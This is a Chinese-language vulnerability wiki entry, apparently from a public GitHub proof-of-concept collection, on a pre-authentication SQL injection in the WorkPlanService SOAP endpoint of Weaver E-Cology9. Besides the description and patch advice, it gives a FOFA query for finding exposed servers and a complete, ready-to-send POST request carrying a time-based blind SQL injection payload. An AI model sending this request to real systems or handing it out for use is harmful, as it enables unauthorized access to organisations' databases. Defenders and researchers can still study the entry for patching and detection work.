---
cnvd: "XVE-2024-18112"
fofa: "app="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 泛微E-Cology9 WorkPlanService 前台SQL注入漏洞(XVE-2024-18112) 

# 漏洞描述

该漏洞是由于泛微e-cology未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现 SQL 注入漏洞。

影响版本

泛微E-Cology9 < 10.65.0

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="泛微-OA（e-cology）"

POC/EXP：

POST /services/WorkPlanService HTTP/1.1
HOST: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Content-Type: text/xml;charset=UTF-8
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
    <soapenv:Header/>
      <soapenv:Body>
      <web:deleteWorkPlan>
         <!--type: string-->
         <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(10-(IF(27=27,0,5)))))NZeo)</web:in0>
         <!--type: int-->
         <web:in1>22</web:in1> 
      </web:deleteWorkPlan>
      </soapenv:Body>
</soapenv:Envelope>

![image-20240729141539240](./.resource/泛微E-Cology9WorkPlanService前台SQL注入漏洞XVE-2024-18112/media/image-20240729141539240.png)


![image-20240729141619810](./.resource/泛微E-Cology9WorkPlanService前台SQL注入漏洞XVE-2024-18112/media/image-20240729141619810.png)


# 修复方案

升级修复方案

官方已发布升级补丁包，支持在线升级和离线补丁安装，可在参考链接https://www.weaver.com.cn/cs/securityDownload.html进行下载使用。

临时缓解方案可能无法完全阻止漏洞的利用，强烈建议尽快升级到修复版本。

1. 使用WAF等安全设备进行防护。

2. 在不影响业务的情况下配置URL访问控制策略。

3. 限制访问来源地址，如非必要，不要将系统开放在互联网上。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
